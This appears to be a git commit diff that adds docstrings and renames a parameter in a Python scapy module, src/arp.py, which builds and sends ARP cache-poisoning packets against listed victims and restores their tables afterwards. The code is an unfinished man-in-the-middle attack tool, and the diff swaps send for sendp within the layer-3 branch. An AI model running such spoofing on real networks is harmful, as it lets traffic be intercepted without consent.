89f82bdeb611ce059ee91469a4c4cc7f7740ea5e
Ivar de Win <ivardewin@gmail.com>
2022-06-02 14:19:52 +0200

    Added docstrings to arp
    Added docstrings to all the functions present in the arp.py file.

--- src/arp.py
+++ src/arp.py
@@ -1,7 +1,17 @@
 from scapy.all import *
 
 
-def create_arp_packet(packet_Information: dict):
+def create_arp_packet(packet_information: dict):
+    """
+    Creates an arp packet based on the information present in dict
+        :param packet_information: dict where information for the packet is stored
+        dict requires at least 5 keys; 
+        op : int
+        psrc : str
+        pdst : str
+        hwsrc : str
+        hwdst : str
+    """
 
     # op = 2 sets the arp table
     # op = 1 requests arp information
@@ -11,16 +21,23 @@ def create_arp_packet(packet_Information: dict):
     # Set Ipsrc of victem to spoof
     # Set macsrc to yourself, such that you become the "server"
     arp_packet = ARP(
-        op=packet_Information["op"],
-        psrc=packet_Information["psrc"],
-        pdst=packet_Information["pdst"],
-        hwsrc=packet_Information["hwsrc"],
-        hwdst=packet_Information["hwdst"],
+        op=packet_information["op"],
+        psrc=packet_information["psrc"],
+        pdst=packet_information["pdst"],
+        hwsrc=packet_information["hwsrc"],
+        hwdst=packet_information["hwdst"],
     )
     return arp_packet
 
 
 def set_up_arp_packet(inf_victim: dict, inf_target: dict, inf_host: dict, poison: bool = False):
+    """
+    Set up the information for an arp packet, and creates the packet.
+        :param inf_victim: dict with ip and mac of victim
+        :param inf_target: dict with ip and mac of target of victim
+        :param inf_host: dict with ip and mac of host
+        :param poison: Decides wheter the packet is malicious or not
+    """
     inf_packet: dict = {}
     # Set packet to set information
     inf_packet["op"] = 2
@@ -35,6 +52,12 @@ def set_up_arp_packet(inf_victim: dict, inf_target: dict, inf_host: dict, poison
 
 
 def poison_victims(victims: list[dict], targets: list[dict], hosts: list[dict]):
+    """
+    Creates poisonous packets for all victims to all targets, with host as malicious actor
+        :param victims: list of dicts with ip and mac of all victims
+        :param targets: list of dicts with ip and mac of all targets
+        :param hosts: list of dicts with ip and mac of all hosts
+    """
     # Create return array for packets
     poison_packets: list = []
     for host in hosts:
@@ -49,6 +72,11 @@ def poison_victims(victims: list[dict], targets: list[dict], hosts: list[dict]):
 
 
 def restore_victims(victims: list[dict], targets: list[dict]):
+    """
+    Creates non-malicious packets for all victims to all targets, with host as malicious actor
+        :param victims: list of dicts with ip and mac of all victims
+        :param targets: list of dicts with ip and mac of all targets
+    """
     # Create return array for packets
     restore_packets: list = []
     for victim in victims:
@@ -62,9 +90,15 @@ def restore_victims(victims: list[dict], targets: list[dict]):
 # send sends on layer 3, sendp sends at layer 2
 # layer 2 and thus sendp requires more information
 # extend this function to make use of send and sendp
+# TODO a lot
 def send_packet(packet, link_layer=3):
+    """
+    Sends a packet over layer
+        :param packet: packet to sent
+        :param link_layer: link_layer to send the packet over
+    """
     if link_layer == 3:
-        send(packet)
+        sendp(packet)
         return
     print("not implemented yet")
 
